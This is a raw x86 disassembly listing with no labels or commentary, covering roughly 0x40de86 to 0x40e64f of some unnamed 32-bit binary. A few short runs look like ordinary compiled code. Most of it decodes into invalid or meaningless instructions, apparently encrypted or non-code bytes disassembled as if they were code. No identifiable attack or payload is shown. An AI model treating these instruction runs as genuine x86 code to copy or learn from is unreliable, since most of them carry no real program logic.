  40de86:	add    BYTE PTR ds:0x4fad,ah
  40de8c:	imul   eax,ecx
  40de8f:	mov    ecx,DWORD PTR ds:0x42260c
  40de95:	sub    esi,eax
  40de97:	mov    eax,DWORD PTR [esi+0x1242a728]
  40de9d:	and    ecx,0x5416
  40dea3:	sub    eax,ecx
  40dea5:	lea    ecx,[eax+0x4406]
  40deab:	mov    eax,ds:0x422610
  40deb0:	mov    esi,DWORD PTR [ebp-0xc]
  40deb3:	xor    edx,edx
  40deb5:	jmp    0x40e270
  40deba:	mov    ecx,0xf597ca97
  40debf:	xchg   edi,eax
  40dec0:	mov    ebp,0x4d8465bd
  40dec5:	add    eax,0x3bba09df
  40deca:	addr16 repz mov ebx,0xbbc5efbb
  40ded1:	mov    ebx,0x3c3d389
  40ded6:	sbb    esi,edi
  40ded8:	cmp    BYTE PTR [esi+0x63],bh
  40dedb:	sub    al,0xe8
  40dedd:	out    0x58,al
  40dedf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dee0:	sbb    BYTE PTR ss:[eax-0xa],ah
  40dee4:	cmp    DWORD PTR [eax-0x581000e1],0x253127b6
  40deee:	mov    esi,0xff0991c6
  40def3:	mov    ebp,0x89ebcdb8
  40def8:	cs push esp
  40defa:	or     DWORD PTR [ecx],ecx
  40defc:	mov    bl,0x52
  40defe:	cmp    BYTE PTR [ecx-0x7b],dl
  40df01:	mov    edi,0xbe971136
  40df06:	repnz test al,0xf0
  40df09:	xchg   esi,eax
  40df0a:	repz inc ebx
  40df0c:	arpl   di,ax
  40df0e:	data16 (bad) 
  40df10:	jo     0x40dec5
  40df12:	and    dl,BYTE PTR [esi-0x1e6f7d80]
  40df18:	shl    DWORD PTR [ebx],cl
  40df1a:	push   edi
  40df1b:	inc    ebx
  40df1c:	retf   
  40df1d:	or     ecx,DWORD PTR ds:0x45e9a4ca
  40df23:	(bad)  
  40df24:	fcomi  st,st(5)
  40df26:	sbb    BYTE PTR [ebx],ah
  40df28:	test   eax,0xb8456471
  40df2d:	push   eax
  40df2e:	pop    ss
  40df2f:	(bad)  
  40df30:	shl    BYTE PTR [edi+0x55],1
  40df33:	add    esp,edi
  40df35:	jb     0x40dfaf
  40df37:	(bad)  
  40df39:	inc    ebx
  40df3a:	shl    BYTE PTR [esi],cl
  40df3c:	test   eax,0xd5d020d1
  40df41:	pushf  
  40df42:	cdq    
  40df43:	(bad)  
  40df44:	cmp    BYTE PTR [ebx-0x54],bl
  40df47:	cli    
  40df48:	in     al,dx
  40df49:	out    0x23,al
  40df4b:	pop    ecx
  40df4c:	adc    al,0x77
  40df4e:	xchg   ecx,eax
  40df4f:	push   edi
  40df50:	jmp    DWORD PTR [eax]
  40df52:	mov    esi,0x987e4ccb
  40df57:	xchg   edi,eax
  40df58:	adc    DWORD PTR [esi+0x3c],ebp
  40df5b:	cwde   
  40df5c:	adc    al,0xb
  40df5e:	mov    esi,0x1dfc5058
  40df63:	push   ds
  40df64:	fwait
  40df65:	outs   dx,DWORD PTR ds:[esi]
  40df66:	mov    ah,0x1c
  40df68:	xor    ecx,DWORD PTR [esi+0x4b795305]
  40df6e:	aas    
  40df6f:	pop    ebp
  40df70:	(bad)  
  40df71:	(bad)  
  40df72:	push   ecx
  40df73:	mov    ah,0xee
  40df75:	imul   esp,DWORD PTR [ebx+0x1a73719b],0xffffffec
  40df7c:	mov    WORD PTR cs:[esi],fs
  40df7f:	push   0xd7c6b5cc
  40df84:	aad    0xd2
  40df86:	rcr    DWORD PTR [ebp-0x22],1
  40df89:	xor    ebp,DWORD PTR ds:0x71ef6626
  40df8f:	out    dx,al
  40df90:	pop    ecx
  40df91:	mov    ch,0xbb
  40df93:	out    0x5f,eax
  40df95:	mov    dh,0x65
  40df97:	outs   dx,DWORD PTR ds:[esi]
  40df98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df99:	cli    
  40df9a:	unpcklps xmm0,xmm0
  40df9d:	sbb    DWORD PTR [ecx+0x6f],esp
  40dfa0:	push   esp
  40dfa1:	add    al,al
  40dfa3:	pop    ebx
  40dfa4:	cmp    edi,DWORD PTR [esi-0x181a61fa]
  40dfaa:	popa   
  40dfab:	and    eax,0x582c4363
  40dfb0:	add    dh,dl
  40dfb2:	je     0x40e01c
  40dfb4:	xchg   esi,eax
  40dfb5:	xchg   ebx,eax
  40dfb6:	mov    al,ds:0x1ca4015
  40dfbb:	mov    ds:0x278f561f,eax
  40dfc0:	mov    ah,0x18
  40dfc2:	rcl    BYTE PTR [edi+edx*2+0x24],0x8a
  40dfc7:	daa    
  40dfc8:	dec    esi
  40dfc9:	int    0x39
  40dfcb:	in     eax,0xbb
  40dfcd:	jae    0x40e030
  40dfcf:	push   es
  40dfd0:	pop    ds
  40dfd1:	hlt    
  40dfd2:	push   esp
  40dfd3:	ds scas eax,DWORD PTR es:[edi]
  40dfd5:	out    dx,eax
  40dfd6:	xchg   edi,eax
  40dfd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfd8:	test   DWORD PTR ds:0xfa351fdf,ebx
  40dfde:	addr16 mov cl,0x8f
  40dfe1:	pop    edx
  40dfe2:	dec    eax
  40dfe3:	int3   
  40dfe4:	inc    eax
  40dfe5:	push   ecx
  40dfe6:	mov    bh,0x29
  40dfe8:	inc    eax
  40dfe9:	test   al,0xbf
  40dfeb:	rcl    BYTE PTR [edx-0xecc60ec],cl
  40dff1:	test   BYTE PTR [edx],bl
  40dff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dff4:	sbb    eax,DWORD PTR [eax+ebx*1]
  40dff7:	xor    DWORD PTR [edi],esi
  40dff9:	leave  
  40dffa:	nop
  40dffb:	test   BYTE PTR [ebx],0x1f
  40dffe:	and    al,BYTE PTR [edi]
  40e000:	jge    0x40df8c
  40e002:	push   edi
  40e003:	rcl    DWORD PTR gs:[eax-0x5996a3b6],0xbb
  40e00b:	icebp  
  40e00c:	bound  ecx,QWORD PTR ds:0x875862f0
  40e012:	rcr    esp,0xae
  40e015:	push   esp
  40e016:	push   ebp
  40e017:	xchg   edx,eax
  40e018:	in     eax,dx
  40e019:	in     al,0xd0
  40e01b:	es push ds
  40e01d:	cmp    DWORD PTR [esi+0x48],esp
  40e020:	jo     0x40e01c
  40e022:	stc    
  40e023:	in     al,dx
  40e024:	data16 fmul QWORD PTR [edi+0x22]
  40e028:	fs add eax,0x3d3b467e
  40e02e:	jecxz  0x40dffa
  40e030:	addr16 out 0x28,eax
  40e033:	cmp    al,0xce
  40e035:	cmp    al,0xdb
  40e037:	aam    0x76
  40e039:	(bad)  
  40e03a:	nop
  40e03b:	push   ds
  40e03c:	xor    eax,0x4e3376b3
  40e041:	out    0x23,al
  40e043:	mov    esp,DWORD PTR [ecx+0x5b]
  40e046:	mov    DWORD PTR [edx-0x3f7a0e8b],0x838a3e47
  40e050:	jo     0x40e03a
  40e052:	sub    bl,dl
  40e054:	retf   
  40e055:	or     edi,ecx
  40e057:	dec    edi
  40e058:	mov    edx,0xb9e9b617
  40e05d:	jbe    0x40e011
  40e05f:	jmp    0x291b:0xe51d6ea8
  40e066:	lea    ebx,[esi]
  40e068:	dec    esp
  40e069:	jl     0x40e091
  40e06b:	and    BYTE PTR [eax],dh
  40e06d:	mov    al,0x97
  40e06f:	jb     0x40e0db
  40e071:	push   0x7
  40e073:	lods   eax,DWORD PTR ds:[esi]
  40e074:	inc    esi
  40e075:	cwde   
  40e076:	xchg   esi,eax
  40e077:	add    eax,0xae42248c
  40e07c:	add    BYTE PTR [ecx],al
  40e07e:	ret    
  40e07f:	out    0x84,al
  40e081:	mov    ebx,0x7a95c077
  40e086:	sub    DWORD PTR [ebp+0x467df39],0xffffffad
  40e08d:	(bad)  
  40e08e:	(bad)  
  40e08f:	iret   
  40e090:	stos   DWORD PTR es:[edi],eax
  40e091:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e092:	or     DWORD PTR [eax+0x77],esp
  40e095:	mov    ds,esi
  40e097:	out    dx,eax
  40e098:	int3   
  40e099:	int3   
  40e09a:	or     al,BYTE PTR [esi+0x9]
  40e09d:	xchg   ebp,eax
  40e09e:	push   esp
  40e09f:	cmp    DWORD PTR [ebp-0x5ce9c6c8],ebx
  40e0a5:	shl    BYTE PTR [edi+edx*2+0x40cd9686],cl
  40e0ac:	inc    edx
  40e0ad:	(bad)  
  40e0ae:	dec    esp
  40e0af:	ds je  0x40e03e
  40e0b2:	jp     0x40e089
  40e0b4:	pop    eax
  40e0b5:	pop    esp
  40e0b6:	rcr    DWORD PTR gs:[ecx-0x50],cl
  40e0ba:	mov    ecx,0x4113dc96
  40e0bf:	pusha  
  40e0c0:	xchg   edi,eax
  40e0c1:	cs push ebx
  40e0c3:	or     eax,0x4391e357
  40e0c8:	jp     0x40e128
  40e0ca:	and    eax,0x378ca655
  40e0cf:	cs xchg esi,eax
  40e0d1:	push   ebp
  40e0d2:	jg     0x40e0a1
  40e0d4:	push   ss
  40e0d5:	add    BYTE PTR [edi-0x39166ff9],dl
  40e0db:	sub    eax,0x6b3ae8dd
  40e0e0:	scas   eax,DWORD PTR es:[edi]
  40e0e1:	pushf  
  40e0e2:	(bad)  
  40e0e3:	ins    DWORD PTR es:[edi],dx
  40e0e4:	in     al,dx
  40e0e5:	pop    esi
  40e0e6:	and    ebp,edi
  40e0e8:	ror    BYTE PTR [ebx],0xe3
  40e0eb:	fistp  DWORD PTR [ecx]
  40e0ed:	push   esi
  40e0ee:	(bad)  
  40e0ef:	out    0xb7,al
  40e0f1:	sub    esp,eax
  40e0f3:	xchg   edx,eax
  40e0f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0f5:	daa    
  40e0f6:	mov    eax,0x5730bb7d
  40e0fb:	test   ebx,ebp
  40e0fd:	inc    edi
  40e0fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0ff:	loope  0x40e16c
  40e101:	jne    0x40e175
  40e103:	pop    ebx
  40e104:	and    al,0x42
  40e106:	pop    ebx
  40e107:	add    ah,al
  40e109:	push   ss
  40e10a:	cmp    eax,0x965d7ead
  40e10f:	test   BYTE PTR [ecx],bh
  40e111:	jns    0x40e0f4
  40e113:	aad    0xac
  40e115:	xlat   BYTE PTR ds:[ebx]
  40e116:	or     edx,DWORD PTR [ebx-0x4f2cc957]
  40e11c:	push   edi
  40e11d:	clc    
  40e11e:	test   al,0x38
  40e120:	pop    ss
  40e121:	lods   al,BYTE PTR ds:[esi]
  40e122:	out    0xba,al
  40e124:	daa    
  40e125:	and    al,0x72
  40e127:	adc    al,0x76
  40e129:	sbb    BYTE PTR [edi-0x52662b7c],dh
  40e12f:	imul   esi,DWORD PTR [esi],0x6c1d7b6b
  40e135:	das    
  40e136:	dec    eax
  40e137:	je     0x40e111
  40e139:	out    0x95,eax
  40e13b:	adc    eax,0x97de1136
  40e140:	std    
  40e141:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e142:	cs ja  0x40e0e4
  40e145:	sahf   
  40e146:	sub    al,0x8
  40e148:	sbb    DWORD PTR ds:0xa960d736,eax
  40e14e:	cmp    ebx,DWORD PTR [ebx-0x4c8b6c39]
  40e154:	inc    DWORD PTR fs:[ecx+edi*1+0x73a11dfd]
  40e15c:	pop    ebp
  40e15d:	dec    ebx
  40e15e:	outs   dx,BYTE PTR ds:[esi]
  40e15f:	iret   
  40e160:	mov    ebp,esp
  40e162:	retf   
  40e163:	adc    DWORD PTR [edx],ecx
  40e165:	pop    esp
  40e166:	unpckhps xmm7,XMMWORD PTR [edi+0x14]
  40e16a:	sbb    BYTE PTR [edx+ebp*4+0x5d90f78f],cl
  40e171:	pop    ss
  40e172:	ins    BYTE PTR es:[edi],dx
  40e173:	xor    eax,DWORD PTR [eax-0x38]
  40e176:	and    al,0xb8
  40e178:	dec    ebx
  40e179:	adc    ecx,DWORD PTR [ecx-0xf88eae2]
  40e17f:	test   eax,0xe2de6ed5
  40e184:	xor    eax,0xfb5010d6
  40e189:	pop    edx
  40e18a:	das    
  40e18b:	jbe    0x40e16f
  40e18d:	(bad)  
  40e18e:	fmulp  st(0),st
  40e190:	dec    dx
  40e192:	or     eax,0xc4bacae6
  40e197:	mov    ebp,0x4009d9a3
  40e19c:	pop    edi
  40e19d:	add    eax,0xd6aaf395
  40e1a2:	sahf   
  40e1a3:	ror    dh,1
  40e1a5:	popa   
  40e1a6:	out    dx,al
  40e1a7:	shl    BYTE PTR [esi+ebp*1+0x386843f7],0x9f
  40e1af:	adc    eax,0x1b83037b
  40e1b4:	pop    edi
  40e1b5:	pop    edi
  40e1b6:	push   ebx
  40e1b7:	lock bound ebx,QWORD PTR [esp+edx*2-0x4d]
  40e1bc:	clc    
  40e1bd:	ins    BYTE PTR es:[edi],dx
  40e1be:	popf   
  40e1bf:	daa    
  40e1c0:	hlt    
  40e1c1:	xor    BYTE PTR [ebp+0x68],al
  40e1c4:	ret    
  40e1c5:	add    cl,BYTE PTR [edx+ebp*1]
  40e1c8:	fld    DWORD PTR [edi-0x71]
  40e1cb:	scas   al,BYTE PTR es:[edi]
  40e1cc:	and    BYTE PTR [ebp+0x7e],al
  40e1cf:	mul    BYTE PTR [esi+ebx*2]
  40e1d2:	mov    cl,BYTE PTR [edi+0x744021b4]
  40e1d8:	mov    eax,DWORD PTR [edi]
  40e1da:	lods   eax,DWORD PTR ds:[esi]
  40e1db:	mov    ecx,0x32a3401c
  40e1e0:	add    BYTE PTR [ecx+0x12],dh
  40e1e3:	cmp    DWORD PTR [ebx-0x4d],eax
  40e1e6:	mov    ah,0xfa
  40e1e8:	rcr    DWORD PTR [ebp+edx*4-0x42],1
  40e1ec:	adc    BYTE PTR [esi],ah
  40e1ee:	lea    ebx,[eax-0x58711332]
  40e1f4:	outs   dx,DWORD PTR ds:[esi]
  40e1f5:	in     eax,0xca
  40e1f7:	push   esp
  40e1f8:	stos   DWORD PTR es:[edi],eax
  40e1f9:	test   eax,0x20c0684d
  40e1fe:	stos   DWORD PTR es:[edi],eax
  40e1ff:	jo     0x40e181
  40e201:	call   0xcba8:0xd450ee40
  40e208:	or     ecx,DWORD PTR [ebx-0x36]
  40e20b:	mov    dl,0x59
  40e20d:	or     ecx,DWORD PTR [eax+0x1f25ae2]
  40e213:	fwait
  40e214:	mov    eax,0xb35d9659
  40e219:	cmp    bh,BYTE PTR [edx-0x5c60bf63]
  40e21f:	jae    0x40e1dc
  40e221:	push   eax
  40e222:	mov    edi,0x56300f79
  40e227:	into   
  40e228:	add    DWORD PTR [ebp+0x50],ebx
  40e22b:	dec    ebp
  40e22c:	aad    0x97
  40e22e:	jl     0x40e26d
  40e230:	shr    ch,1
  40e232:	out    0xb2,eax
  40e234:	cs sbb ch,al
  40e237:	(bad)  
  40e238:	out    0x79,eax
  40e23a:	sbb    eax,0xa2497115
  40e23f:	mov    cl,0xac
  40e241:	dec    ecx
  40e242:	dec    eax
  40e243:	and    DWORD PTR [edi+0x43],esi
  40e246:	fsub   DWORD PTR [eax]
  40e248:	(bad)  
  40e249:	into   
  40e24a:	push   esi
  40e24b:	scas   eax,DWORD PTR es:[edi]
  40e24c:	jge    0x40e297
  40e24e:	xor    ecx,DWORD PTR [edx+0x23f83bb1]
  40e254:	mov    ch,0xb
  40e256:	dec    ebp
  40e257:	dec    edi
  40e258:	xchg   BYTE PTR [esi],bl
  40e25a:	mov    ah,BYTE PTR [edi-0x4f20d47]
  40e260:	out    dx,eax
  40e261:	gs sbb eax,esi
  40e264:	jmp    0x3c2d05ec
  40e269:	mov    edi,0x5ef8fe7e
  40e26e:	push   ss
  40e26f:	xchg   ebx,eax
  40e270:	div    esi
  40e272:	push   0x1
  40e274:	push   0x6aca2c1a
  40e279:	or     eax,0x1187
  40e27e:	sub    eax,0x70a
  40e283:	xor    eax,0x368d
  40e288:	add    eax,DWORD PTR [ecx]
  40e28a:	mov    ecx,DWORD PTR ds:0x42233c
  40e290:	add    DWORD PTR [eax],ecx
  40e292:	mov    eax,ds:0x422620
  40e297:	mov    ecx,DWORD PTR ds:0x422624
  40e29d:	push   ecx
  40e29e:	push   eax
  40e29f:	call   0x418100
  40e2a4:	mov    ecx,DWORD PTR [ebp-0x40]
  40e2a7:	mov    esi,DWORD PTR [ebp-0x3c]
  40e2aa:	and    ecx,eax
  40e2ac:	mov    eax,ds:0x422618
  40e2b1:	and    esi,edx
  40e2b3:	mov    edx,DWORD PTR ds:0x42261c
  40e2b9:	add    eax,ecx
  40e2bb:	adc    esi,edx
  40e2bd:	mov    edx,DWORD PTR ds:0x42233c
  40e2c3:	add    eax,0xfffff6ba
  40e2c8:	mov    ecx,esi
  40e2ca:	adc    ecx,0xffff864d
  40e2d0:	xor    esi,esi
  40e2d2:	cmp    edx,eax
  40e2d4:	jne    0x40ea86
  40e2da:	cmp    esi,ecx
  40e2dc:	jne    0x40ea86
  40e2e2:	jmp    0x40e69d
  40e2e7:	popf   
  40e2e8:	fld    TBYTE PTR [eax+0x40]
  40e2eb:	mov    ebp,0x137bd48
  40e2f0:	xor    BYTE PTR [edi+0x5],dh
  40e2f3:	pop    ss
  40e2f4:	cmc    
  40e2f5:	(bad)  
  40e2f6:	das    
  40e2f7:	call   0xbbc5:0xefbbbbfb
  40e2fe:	mov    ebx,0x52f2a7e3
  40e303:	inc    edi
  40e304:	jge    0x40e34d
  40e306:	xor    BYTE PTR [eax-0x6],ch
  40e309:	or     edi,edi
  40e30b:	xor    ecx,DWORD PTR [eax+edi*2-0x151961df]
  40e312:	adc    BYTE PTR [ecx+0x1d],0xf1
  40e316:	ja     0x40e31c
  40e318:	(bad)  
  40e319:	xor    cl,al
  40e31b:	and    al,0x8d
  40e31d:	mov    bl,0x6f
  40e31f:	mov    eax,ds:0xdf216a62
  40e324:	xchg   edx,eax
  40e325:	out    0xe5,eax
  40e327:	bound  edi,QWORD PTR ds:0xd64a4199
  40e32d:	clc    
  40e32e:	jae    0x40e30d
  40e330:	fucomip st,st(7)
  40e332:	jb     0x40e382
  40e334:	or     DWORD PTR [ecx],esp
  40e336:	dec    ebx
  40e337:	cmp    DWORD PTR [ecx-0x7bf31cc5],ecx
  40e33d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e33e:	stos   BYTE PTR es:[edi],al
  40e33f:	cmp    al,BYTE PTR [ebx+0x62]
  40e342:	or     eax,0x73d99014
  40e347:	gs (bad) 
  40e349:	lahf   
  40e34a:	xchg   edx,eax
  40e34b:	shl    BYTE PTR [ecx-0x51],0x51
  40e34f:	stc    
  40e350:	lock mov ds:0x5684c664,al
  40e356:	rol    BYTE PTR ds:0xd82f0985,0x20
  40e35d:	ds cli 
  40e35f:	fld    TBYTE PTR [ecx+0x32a8f468]
  40e365:	fucomip st,st(7)
  40e367:	cwde   
  40e368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e369:	pop    ss
  40e36a:	xchg   ebp,eax
  40e36b:	neg    BYTE PTR [eax+0x76]
  40e36e:	sub    eax,0x1098ea03
  40e373:	into   
  40e374:	shl    BYTE PTR [edi+0x2c],cl
  40e377:	pop    edi
  40e378:	inc    eax
  40e379:	push   DWORD PTR [ebx-0x37]
  40e37c:	cmc    
  40e37d:	arpl   WORD PTR [ecx+0x451fca29],bp
  40e383:	aaa    
  40e384:	add    ecx,edi
  40e386:	fs dec ebp
  40e388:	sub    esp,ecx
  40e38a:	mov    eax,0x683bdcb6
  40e38f:	add    edx,0x65
  40e392:	ret    0x20c3
  40e395:	mov    edx,0x497c909f
  40e39a:	jns    0x40e3eb
  40e39c:	in     eax,0x2f
  40e39e:	pop    ecx
  40e39f:	(bad)  
  40e3a0:	add    eax,0xe17b8487
  40e3a5:	jecxz  0x40e34a
  40e3a7:	and    eax,0xd1199d1b
  40e3ac:	ss mov ecx,0x1fd104ff
  40e3b2:	js     0x40e430
  40e3b4:	jae    0x40e3bd
  40e3b6:	shl    DWORD PTR [eax+edx*8-0x55],0x71
  40e3bb:	mov    eax,0xb771207
  40e3c0:	es mov al,0x54
  40e3c3:	loope  0x40e3c1
  40e3c5:	cmp    eax,0xa43050ab
  40e3ca:	jp     0x40e385
  40e3cc:	mov    edx,DWORD PTR [ebp-0x80]
  40e3cf:	inc    esi
  40e3d0:	mov    BYTE PTR [esi],bh
  40e3d2:	popa   
  40e3d3:	ficom  DWORD PTR [ebp-0x6e]
  40e3d6:	les    ebx,FWORD PTR [eax]
  40e3d8:	xor    edi,DWORD PTR gs:[ecx-0x47]
  40e3dc:	arpl   WORD PTR [ebx-0x26e31060],si
  40e3e2:	loopne 0x40e386
  40e3e4:	jg     0x40e3ec
  40e3e6:	cwde   
  40e3e7:	loop   0x40e38b
  40e3e9:	mov    ecx,0xb4382daf
  40e3ee:	lock enter 0x80c9,0x50
  40e3f3:	xchg   BYTE PTR [ecx-0x77b91068],bl
  40e3f9:	or     esi,ebp
  40e3fb:	test   al,0xfe
  40e3fd:	xor    al,0xff
  40e3ff:	sbb    ah,al
  40e401:	inc    eax
  40e402:	ret    
  40e403:	aad    0x66
  40e405:	mov    ebx,DWORD PTR [si]
  40e408:	ret    
  40e409:	retf   0x9642
  40e40c:	leave  
  40e40d:	or     BYTE PTR [ebp-0x7a],dh
  40e410:	int    0x7f
  40e412:	(bad)  [ecx]
  40e414:	pop    ebp
  40e415:	adc    al,BYTE PTR [ecx-0x34992025]
  40e41b:	inc    edi
  40e41c:	fs call 0x2464ac7
  40e422:	out    dx,eax
  40e423:	mov    al,0x87
  40e425:	nop
  40e426:	(bad)  
  40e427:	cs add al,0x7f
  40e42a:	loope  0x40e4a3
  40e42c:	cmp    al,0x57
  40e42e:	in     eax,dx
  40e42f:	(bad)  
  40e430:	call   0x65b4250a
  40e435:	call   0xabdcb7a1
  40e43a:	dec    ebp
  40e43b:	sbb    dh,al
  40e43d:	jecxz  0x40e43f
  40e43f:	adc    al,0xf8
  40e441:	sti    
  40e442:	push   es
  40e443:	call   0x9dcd:0xdbceb27a
  40e44a:	(bad)  
  40e44c:	popf   
  40e44d:	rep ins DWORD PTR es:[edi],dx
  40e44f:	push   ebp
  40e450:	jecxz  0x40e4bd
  40e452:	rol    DWORD PTR [edx-0x3e928667],1
  40e458:	add    BYTE PTR [ebx-0x61a893f9],bh
  40e45e:	les    eax,FWORD PTR [ecx]
  40e460:	mov    ch,BYTE PTR [esi-0x47315069]
  40e466:	retf   0xf068
  40e469:	sbb    eax,0x34501603
  40e46e:	pop    ebx
  40e46f:	xor    al,cl
  40e471:	popa   
  40e472:	push   ds
  40e473:	adc    al,0x53
  40e475:	cmp    esi,DWORD PTR [ecx-0x624616d6]
  40e47b:	addr16 lahf 
  40e47d:	cwde   
  40e47e:	fisttp QWORD PTR [esi+0x39]
  40e481:	mov    ebx,0x30619f13
  40e486:	shl    DWORD PTR [edi-0x5ac8e4b],1
  40e48c:	fisubr DWORD PTR [eax]
  40e48e:	jne    0x40e46f
  40e490:	xchg   edx,eax
  40e491:	loope  0x40e482
  40e493:	stos   BYTE PTR es:[edi],al
  40e494:	fnsave [edi]
  40e496:	ins    BYTE PTR es:[edi],dx
  40e497:	in     eax,0x22
  40e499:	jge    0x40e485
  40e49b:	fimul  DWORD PTR [esi-0x7d]
  40e49e:	jb     0x40e49e
  40e4a0:	std    
  40e4a1:	jo     0x40e4fd
  40e4a3:	lock mov BYTE PTR [ebp+0x12170fe9],bh
  40e4aa:	mov    dh,0x1
  40e4ac:	pop    edi
  40e4ad:	inc    esp
  40e4ae:	es add al,0x6e
  40e4b1:	out    dx,al
  40e4b2:	scas   al,BYTE PTR es:[edi]
  40e4b3:	mov    bl,0x5
  40e4b5:	repz loope 0x40e51a
  40e4b8:	int    0xe3
  40e4ba:	jge    0x40e4f0
  40e4bc:	lods   eax,DWORD PTR ds:[esi]
  40e4bd:	and    eax,0xf0a0e202
  40e4c2:	mov    edi,0xf13f8c6a
  40e4c7:	loope  0x40e53a
  40e4c9:	mov    al,0xb4
  40e4cb:	call   0x4ad2:0x9413560
  40e4d2:	xchg   ebp,eax
  40e4d3:	fidiv  DWORD PTR [ebp+ecx*2-0x3c]
  40e4d7:	dec    BYTE PTR [edi+0xf]
  40e4da:	call   0x149cd2d5
  40e4df:	mov    ds:0x372ddadc,eax
  40e4e4:	lahf   
  40e4e5:	mov    esi,0xcda609ec
  40e4ea:	inc    esi
  40e4eb:	ja     0x40e4ee
  40e4ed:	shl    BYTE PTR [bp-0x74],cl
  40e4f1:	out    0x1,eax
  40e4f3:	jecxz  0x40e505
  40e4f5:	pop    ds
  40e4f6:	adc    DWORD PTR [edi+0x58],edx
  40e4f9:	dec    ebx
  40e4fa:	fsub   DWORD PTR [edi]
  40e4fc:	add    eax,0x67a23c58
  40e501:	sti    
  40e502:	or     BYTE PTR [edi],0x36
  40e505:	pop    esi
  40e506:	xchg   ecx,eax
  40e507:	sbb    DWORD PTR [esi-0x38413f46],esi
  40e50d:	cs popf 
  40e50f:	jp     0x40e50e
  40e511:	and    al,0x68
  40e513:	scas   al,BYTE PTR es:[edi]
  40e514:	test   BYTE PTR [ebp+0x5e],ah
  40e517:	sbb    eax,DWORD PTR [edi+0x7a]
  40e51a:	add    dl,dh
  40e51c:	mov    ch,0xe4
  40e51e:	add    al,0x82
  40e520:	cmp    al,0x84
  40e522:	jmp    0xe6ac:0x555d6479
  40e529:	(bad)  
  40e52a:	sub    eax,0x15a8fd8
  40e52f:	retf   0xc01f
  40e532:	pop    edi
  40e533:	xchg   ebp,eax
  40e534:	mov    esp,0x57aa99ab
  40e539:	les    ecx,FWORD PTR cs:[ebx+0x1d]
  40e53d:	aaa    
  40e53e:	mov    edi,0x61e72531
  40e543:	rol    BYTE PTR [esi],0x85
  40e546:	fild   WORD PTR [ebp+0x3f27f9e5]
  40e54c:	mov    ebp,0x926caa75
  40e551:	jno    0x40e4d3
  40e553:	mov    al,bh
  40e555:	pusha  
  40e556:	imul   ebp,DWORD PTR [eax+0x24],0x5ac19e0d
  40e55d:	adc    dh,dh
  40e55f:	adc    edi,DWORD PTR [ecx+0x68325883]
  40e565:	pop    eax
  40e566:	ss pop ecx
  40e568:	push   esp
  40e569:	repz mov ecx,0x391edf9b
  40e56f:	dec    ecx
  40e570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e571:	or     eax,0xbd7ae1e7
  40e576:	hlt    
  40e577:	sar    BYTE PTR ds:0xa6babd84,cl
  40e57d:	jae    0x40e522
  40e57f:	loope  0x40e563
  40e581:	jae    0x40e57d
  40e583:	sbb    ch,BYTE PTR [ebx]
  40e585:	and    DWORD PTR ds:0x964ce1b3,edx
  40e58b:	popf   
  40e58c:	ss sahf 
  40e58e:	xchg   edx,eax
  40e58f:	mov    ebx,0x88332310
  40e594:	cmp    BYTE PTR [ebp+0x55b9b9f0],0x9f
  40e59b:	(bad)  
  40e59c:	and    ch,BYTE PTR [ebx-0x6925589c]
  40e5a2:	cbw    
  40e5a4:	cli    
  40e5a5:	and    eax,0x45a14897
  40e5aa:	push   edi
  40e5ab:	pop    ss
  40e5ac:	and    BYTE PTR [eax+0x46ecc7b],dh
  40e5b2:	push   ecx
  40e5b3:	dec    ecx
  40e5b4:	push   cs
  40e5b5:	lds    ebx,FWORD PTR [esi]
  40e5b7:	fst    QWORD PTR [edx-0x180239e]
  40e5bd:	not    DWORD PTR [ebx]
  40e5bf:	or     esi,edx
  40e5c1:	daa    
  40e5c2:	mov    ch,0x72
  40e5c4:	or     al,0x2e
  40e5c6:	(bad)  
  40e5c7:	xchg   ebp,eax
  40e5c8:	sahf   
  40e5c9:	ret    0x6fe7
  40e5cc:	cmp    BYTE PTR [ebp+0x2c51f320],cl
  40e5d2:	aaa    
  40e5d3:	(bad)  
  40e5d4:	pop    ebp
  40e5d5:	mov    ecx,0x8a75e065
  40e5da:	mov    eax,ds:0xef97b39
  40e5df:	je     0x40e64d
  40e5e1:	push   edi
  40e5e2:	pop    edx
  40e5e3:	add    edi,DWORD PTR [esi+0x1d]
  40e5e6:	jge    0x40e5b8
  40e5e8:	add    al,0x28
  40e5ea:	sub    al,BYTE PTR [ecx+ebp*4]
  40e5ed:	je     0x40e618
  40e5ef:	rcr    BYTE PTR [edi+0x779154f8],1
  40e5f5:	test   BYTE PTR [ebx-0x7c70636f],bh
  40e5fb:	jg     0x40e5b2
  40e5fd:	mov    edi,0x7d4dd5cf
  40e602:	cmp    dl,bl
  40e604:	xor    BYTE PTR [edi*2+0x2f8d9be3],al
  40e60b:	icebp  
  40e60c:	adc    eax,0xc1d29605
  40e611:	lea    ebx,[eax]
  40e613:	popf   
  40e614:	inc    edi
  40e615:	push   cs
  40e616:	jbe    0x40e666
  40e618:	ins    BYTE PTR es:[edi],dx
  40e619:	(bad)  
  40e61a:	ffreep st(5)
  40e61c:	push   ebx
  40e61d:	fs je  0x40e5f7
  40e620:	(bad)  
  40e621:	fmul   QWORD PTR [esi]
  40e623:	aad    0x18
  40e625:	ror    edx,cl
  40e627:	pop    esi
  40e628:	xor    bh,dl
  40e62a:	in     eax,0x1a
  40e62c:	xchg   edi,eax
  40e62d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e62e:	sbb    al,0x24
  40e630:	inc    esi
  40e631:	cmc    
  40e632:	inc    ebp
  40e633:	mov    cs,WORD PTR [ebp-0x42bc68e6]
  40e639:	sbb    eax,0x9ec25f7b
  40e63e:	pusha  
  40e63f:	xchg   ebp,eax
  40e640:	sbb    ebx,DWORD PTR [eax+esi*4-0x53]
  40e644:	repnz pop ebp
  40e646:	or     ch,BYTE PTR ds:0x5cd81010
  40e64c:	inc    eax
  40e64d:	jo     0x40e61d
  40e64f:	rcr    DWORD PTR ds:0x9a9af4ea,0xf2
